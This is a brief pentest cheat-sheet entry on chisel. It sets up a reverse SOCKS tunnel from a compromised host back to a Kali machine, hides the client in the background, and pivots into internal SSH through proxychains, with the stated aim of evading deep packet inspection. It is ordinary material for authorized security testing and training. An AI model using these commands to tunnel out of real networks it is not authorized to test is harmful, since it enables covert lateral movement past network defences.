---
title: Chisel - HTTP-Tunneled SOCKS
category: tunnels
subcategory: tunneling-tools
os: linux, windows
command: chisel client kali:port R:socks
tools: chisel
---


Encapsulates traffic in HTTP, encrypts internally with SSH. Useful when DPI blocks raw SSH.

### Server on Kali

```bash
chisel server --port 9090 --reverse
```

### Client on the compromised host

```bash
./chisel client 192.168.118.12:9090 R:socks > /dev/null 2>&1 &
```

### Verify the SOCKS proxy on Kali

```bash
ss -ntplu
```

Expect a listener on 127.0.0.1:1080.

### Use through ProxyChains

`/etc/proxychains4.conf`:

```
[ProxyList]
socks5 127.0.0.1 1080
```

```bash
proxychains ssh sysadmin@10.8.20.130
```
